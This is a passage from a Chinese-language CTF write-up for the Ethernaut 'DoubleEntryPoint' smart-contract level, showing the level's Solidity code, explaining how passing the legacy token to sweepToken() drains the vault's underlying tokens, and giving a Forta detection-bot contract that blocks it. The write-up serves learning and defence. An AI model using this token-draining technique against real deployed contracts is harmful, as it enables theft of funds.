<span class="w">        </span><span class="nx">require</span><span class="p">(</span><span class="nx">token</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="nx">underlying</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;Can&#39;t transfer underlying token&quot;</span><span class="p">);</span>
<span class="w">        </span><span class="nx">token</span><span class="p">.</span><span class="nx">transfer</span><span class="p">(</span><span class="nx">sweptTokensRecipient</span><span class="p">,</span><span class="w"> </span><span class="nx">token</span><span class="p">.</span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">)));</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>

<span class="nx">contract</span><span class="w"> </span><span class="nx">LegacyToken</span><span class="w"> </span><span class="nx">is</span><span class="w"> </span><span class="nx">ERC20</span><span class="p">(</span><span class="s2">&quot;LegacyToken&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;LGT&quot;</span><span class="p">),</span><span class="w"> </span><span class="nx">Ownable</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">DelegateERC20</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">delegate</span><span class="p">;</span>

<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">mint</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">to</span><span class="p">,</span><span class="w"> </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">amount</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">onlyOwner</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">_mint</span><span class="p">(</span><span class="nx">to</span><span class="p">,</span><span class="w"> </span><span class="nx">amount</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">delegateToNewContract</span><span class="p">(</span><span class="nx">DelegateERC20</span><span class="w"> </span><span class="nx">newContract</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">onlyOwner</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">delegate</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">newContract</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">transfer</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">to</span><span class="p">,</span><span class="w"> </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">value</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">override</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">bool</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">delegate</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="mf">0</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="k">super</span><span class="p">.</span><span class="nx">transfer</span><span class="p">(</span><span class="nx">to</span><span class="p">,</span><span class="w"> </span><span class="nx">value</span><span class="p">);</span>
<span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="nx">delegate</span><span class="p">.</span><span class="nx">delegateTransfer</span><span class="p">(</span><span class="nx">to</span><span class="p">,</span><span class="w"> </span><span class="nx">value</span><span class="p">,</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">);</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>

<span class="nx">contract</span><span class="w"> </span><span class="nx">DoubleEntryPoint</span><span class="w"> </span><span class="nx">is</span><span class="w"> </span><span class="nx">ERC20</span><span class="p">(</span><span class="s2">&quot;DoubleEntryPointToken&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;DET&quot;</span><span class="p">),</span><span class="w"> </span><span class="nx">DelegateERC20</span><span class="p">,</span><span class="w"> </span><span class="nx">Ownable</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">address</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">cryptoVault</span><span class="p">;</span>
<span class="w">    </span><span class="nx">address</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">player</span><span class="p">;</span>
<span class="w">    </span><span class="nx">address</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">delegatedFrom</span><span class="p">;</span>
<span class="w">    </span><span class="nx">Forta</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">forta</span><span class="p">;</span>

<span class="w">    </span><span class="kr">constructor</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">legacyToken</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="w"> </span><span class="nx">vaultAddress</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="w"> </span><span class="nx">fortaAddress</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="w"> </span><span class="nx">playerAddress</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">delegatedFrom</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">legacyToken</span><span class="p">;</span>
<span class="w">        </span><span class="nx">forta</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">Forta</span><span class="p">(</span><span class="nx">fortaAddress</span><span class="p">);</span>
<span class="w">        </span><span class="nx">player</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">playerAddress</span><span class="p">;</span>
<span class="w">        </span><span class="nx">cryptoVault</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">vaultAddress</span><span class="p">;</span>
<span class="w">        </span><span class="nx">_mint</span><span class="p">(</span><span class="nx">cryptoVault</span><span class="p">,</span><span class="w"> </span><span class="mf">100</span><span class="w"> </span><span class="nx">ether</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="nx">modifier</span><span class="w"> </span><span class="nx">onlyDelegateFrom</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">require</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">delegatedFrom</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;Not legacy contract&quot;</span><span class="p">);</span>
<span class="w">        </span><span class="nx">_</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="nx">modifier</span><span class="w"> </span><span class="nx">fortaNotify</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">address</span><span class="w"> </span><span class="nx">detectionBot</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="nx">forta</span><span class="p">.</span><span class="nx">usersDetectionBots</span><span class="p">(</span><span class="nx">player</span><span class="p">));</span>

<span class="w">        </span><span class="c1">// Cache old number of bot alerts</span>
<span class="w">        </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">previousValue</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">forta</span><span class="p">.</span><span class="nx">botRaisedAlerts</span><span class="p">(</span><span class="nx">detectionBot</span><span class="p">);</span>

<span class="w">        </span><span class="c1">// Notify Forta</span>
<span class="w">        </span><span class="nx">forta</span><span class="p">.</span><span class="nx">notify</span><span class="p">(</span><span class="nx">player</span><span class="p">,</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">data</span><span class="p">);</span>

<span class="w">        </span><span class="c1">// Continue execution</span>
<span class="w">        </span><span class="nx">_</span><span class="p">;</span>

<span class="w">        </span><span class="c1">// Check if alarms have been raised</span>
<span class="w">        </span><span class="k">if</span><span class="p">(</span><span class="nx">forta</span><span class="p">.</span><span class="nx">botRaisedAlerts</span><span class="p">(</span><span class="nx">detectionBot</span><span class="p">)</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="nx">previousValue</span><span class="p">)</span><span class="w"> </span><span class="nx">revert</span><span class="p">(</span><span class="s2">&quot;Alert has been triggered, reverting&quot;</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">delegateTransfer</span><span class="p">(</span>
<span class="w">        </span><span class="nx">address</span><span class="w"> </span><span class="nx">to</span><span class="p">,</span>
<span class="w">        </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">value</span><span class="p">,</span>
<span class="w">        </span><span class="nx">address</span><span class="w"> </span><span class="nx">origSender</span>
<span class="w">    </span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">override</span><span class="w"> </span><span class="nx">onlyDelegateFrom</span><span class="w"> </span><span class="nx">fortaNotify</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">bool</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">_transfer</span><span class="p">(</span><span class="nx">origSender</span><span class="p">,</span><span class="w"> </span><span class="nx">to</span><span class="p">,</span><span class="w"> </span><span class="nx">value</span><span class="p">);</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>
<ul>
<li>传入 <code>CryptoVault.sweepToken()</code> 代币的地址不能等于 <code>underlying</code>，而若传入 <code>LegacyToken</code> 的地址，将调用 <code>delegateTransfer</code>，实际转移的是 <code>CryptoVault</code> 持有的 <code>DET</code> 代币，对应 <code>underlying</code></li>
<li>
<p>若 <code>origSender</code> 为 <code>CryptoVault</code> 的实例则 <code>raiseAlert</code></p>
<div class="highlight"><pre><span></span><code><span class="nx">contract</span><span class="w"> </span><span class="nx">DetectionBot</span><span class="w"> </span><span class="nx">is</span><span class="w"> </span><span class="nx">IDetectionBot</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="nx">address</span><span class="w"> </span><span class="nx">vault</span><span class="p">;</span>

<span class="w">  </span><span class="kr">constructor</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">instance</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">DoubleEntryPoint</span><span class="w"> </span><span class="nx">dep</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">DoubleEntryPoint</span><span class="p">(</span><span class="nx">instance</span><span class="p">);</span>
<span class="w">    </span><span class="nx">vault</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">dep</span><span class="p">.</span><span class="nx">cryptoVault</span><span class="p">();</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">handleTransaction</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">user</span><span class="p">,</span><span class="w"> </span><span class="nx">bytes</span><span class="w"> </span><span class="nx">calldata</span><span class="w"> </span><span class="nx">msgData</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="c1">// skip the 4-byte function signature</span>
<span class="w">    </span><span class="p">(</span><span class="w"> </span><span class="p">,</span><span class="w"> </span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="w"> </span><span class="nx">sender</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">abi</span><span class="p">.</span><span class="nx">decode</span><span class="p">(</span><span class="nx">msgData</span><span class="p">[</span><span class="mf">4</span><span class="o">:</span><span class="p">],</span><span class="w"> </span><span class="p">(</span><span class="nx">address</span><span class="p">,</span><span class="w"> </span><span class="nx">uint256</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="p">));</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">sender</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">vault</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="nx">IForta</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">).</span><span class="nx">raiseAlert</span><span class="p">(</span><span class="nx">user</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>
</li>
<li>
<p>部署 <code>DetectionBot</code> 后，使用 <code>player</code> 账户调用 <code>Forta.setDetectionBot()</code></p>
</li>
<li>可以在 <code>sweepToken()</code> 的最后检查合约 <code>underlying</code> 的余额是否和调用前相同</li>
</ul>
<h3 id="_17">参考资料<a class="headerlink" href="#_17" title="Permanent link">&para;</a></h3>
<ul>
<li><a href="https://solidity-by-example.org/abi-decode/">ABI Decode | Solidity by Example</a></li>
<li><a href="https://github.com/ethereum/solidity/issues/6012">abi.decode cannot decode <code>msg.data</code> · Issue #6012 · ethereum/solidity</a></li>
<li><a href="https://medium.com/chainsecurity/trueusd-compound-vulnerability-bc5b696d29e2">TrueUSD ↔ Compound Vulnerability | by ChainSecurity | ChainSecurity | Medium</a></li>
</ul>

  <hr>
<div class="md-source-file">
  <small>
    
      最后更新:
      <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-datetime">2023年3月4日 21:27:06</span>
      
    
  </small>
</div>

              

  
    <div class="md-source-date">
      <small>
          <span class="twemoji">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M5.5 3.5a2 2 0 1 0 0 4 2 2 0 0 0 0-4zM2 5.5a3.5 3.5 0 1 1 5.898 2.549 5.507 5.507 0 0 1 3.034 4.084.75.75 0 1 1-1.482.235 4.001 4.001 0 0 0-7.9 0 .75.75 0 0 1-1.482-.236A5.507 5.507 0 0 1 3.102 8.05 3.49 3.49 0 0 1 2 5.5zM11 4a.75.75 0 1 0 0 1.5 1.5 1.5 0 0 1 .666 2.844.75.75 0 0 0-.416.672v.352a.75.75 0 0 0 .574.73c1.2.289 2.162 1.2 2.522 2.372a.75.75 0 1 0 1.434-.44 5.01 5.01 0 0 0-2.56-3.012A3 3 0 0 0 11 4z"/></svg> 
          </span>
          Contributors: <span class='git-page-authors git-authors'><a href='mailto:137126578@qq.com'>YanhuiJessica</a></span>
      </small>
      <br>
      <small>
          <span id="busuanzi_container_page_pv">
            <span class="twemoji">
              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0 8a5 5 0 0 1-5-5 5 5 0 0 1 5-5 5 5 0 0 1 5 5 5 5 0 0 1-5 5m0-12.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5Z"/></svg>
            </span>
            Pageviews: <span id="busuanzi_value_page_pv"></span>
          </span>
      </small>
    </div>
  
  
  <!-- Giscus -->
  <h2 id="__comments">评论</h2>
  <script src="https://giscus.app/client.js"
      data-repo="YanhuiJessica/Chictf-Writeups"
      data-repo-id="MDEwOlJlcG9zaXRvcnkyNDg1MTU1OTc="
      data-category="General"
      data-category-id="DIC_kwDODtAMDc4CP_N3"
      data-mapping="title"
      data-reactions-enabled="1"
      data-emit-metadata="0"
      data-input-position="top"
      data-theme="light"
      data-lang="zh-CN"
      data-loading="lazy"
      crossorigin="anonymous"
      async>
  </script>

  <!-- Synchronize Giscus theme with palette -->
  <script>
    var giscus = document.querySelector("script[src*=giscus]")

    /* Set palette on initial load */
    var palette = __md_get("__palette")
    if (palette && typeof palette.color === "object") {
      var theme = palette.color.scheme === "slate" ? "dark" : "light"
      giscus.setAttribute("data-theme", theme)
    }

    /* Register event handlers after documented loaded */
    document.addEventListener("DOMContentLoaded", function() {
      var ref = document.querySelector("[data-md-component=palette]")
      ref.addEventListener("change", function() {
        var palette = __md_get("__palette")
        if (palette && typeof palette.color === "object") {
          var theme = palette.color.scheme === "slate" ? "dark" : "light"

          /* Instruct Giscus to change theme */
          var frame = document.querySelector(".giscus-frame")
          frame.contentWindow.postMessage(
            { giscus: { setConfig: { theme } } },
            "https://giscus.app"
          )
        }
      })
    })
  </script>

            </article>
            
          </div>
        </div>
        
          <a href="#" class="md-top md-icon" data-md-component="top" hidden>
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8v12Z"/></svg>
            回到页面顶部
          </a>
        
      </main>
      
        <footer class="md-footer">
  
    
    <nav class="md-footer__inner md-grid" aria-label="页脚" >
      
        
        <a href="../protostar/final/" class="md-footer__link md-footer__link--prev" aria-label="上一页: Final" rel="prev">
          <div class="md-footer__button md-icon">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
          </div>
          <div class="md-footer__title">
            <div class="md-ellipsis">
              <span class="md-footer__direction">
                上一页
              </span>
              Final
            </div>
          </div>
        </a>
      
      
        
        <a href="../solana_pathway/" class="md-footer__link md-footer__link--next" aria-label="下一页: Solana Pathway" rel="next">
          <div class="md-footer__title">
            <div class="md-ellipsis">
              <span class="md-footer__direction">
                下一页
              </span>
              Solana Pathway
            </div>
          </div>
          <div class="md-footer__button md-icon">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4Z"/></svg>
          </div>
        </a>
      
    </nav>
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
    <div class="md-copyright__highlight">
      Copyright &copy; 2020 - 2022 YanhuiJessica
    </div>
  
  
</div>
      
        <div class="md-social">
  
    
    
      
      
    
    <a href="https://github.com/YanhuiJessica" target="_blank" rel="noopener" title="github.com" class="md-social__link">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 480 512"><!--! Font Awesome Free 6.1.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M186.1 328.7c0 20.9-10.9 55.1-36.7 55.1s-36.7-34.2-36.7-55.1 10.9-55.1 36.7-55.1 36.7 34.2 36.7 55.1zM480 278.2c0 31.9-3.2 65.7-17.5 95-37.9 76.6-142.1 74.8-216.7 74.8-75.8 0-186.2 2.7-225.6-74.8-14.6-29-20.2-63.1-20.2-95 0-41.9 13.9-81.5 41.5-113.6-5.2-15.8-7.7-32.4-7.7-48.8 0-21.5 4.9-32.3 14.6-51.8 45.3 0 74.3 9 108.8 36 29-6.9 58.8-10 88.7-10 27 0 54.2 2.9 80.4 9.2 34-26.7 63-35.2 107.8-35.2 9.8 19.5 14.6 30.3 14.6 51.8 0 16.4-2.6 32.7-7.7 48.2 27.5 32.4 39 72.3 39 114.2zm-64.3 50.5c0-43.9-26.7-82.6-73.5-82.6-18.9 0-37 3.4-56 6-14.9 2.3-29.8 3.2-45.1 3.2-15.2 0-30.1-.9-45.1-3.2-18.7-2.6-37-6-56-6-46.8 0-73.5 38.7-73.5 82.6 0 87.8 80.4 101.3 150.4 101.3h48.2c70.3 0 150.6-13.4 150.6-101.3zm-82.6-55.1c-25.8 0-36.7 34.2-36.7 55.1s10.9 55.1 36.7 55.1 36.7-34.2 36.7-55.1-10.9-55.1-36.7-55.1z"/></svg>
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    <script id="__config" type="application/json">{"base": "../..", "features": ["navigation.tabs", "navigation.top", "navigation.tracking", "search.suggest", "search.highlight", "search.share"], "search": "../../assets/javascripts/workers/search.b028fd86.min.js", "translations": {"clipboard.copied": "\u5df2\u590d\u5236", "clipboard.copy": "\u590d\u5236", "search.config.lang": "ja", "search.config.pipeline": "trimmer, stemmer", "search.config.separator": "[\\s\\-\uff0c\u3002]+", "search.placeholder": "\u641c\u7d22", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.term.missing": "\u7f3a\u5c11", "select.version.title": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}}</script>
    
    
      <script src="../../assets/javascripts/bundle.f758a944.min.js"></script>
      
        <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
      
        <script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
      
        <script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
      
    
  </body>
</html>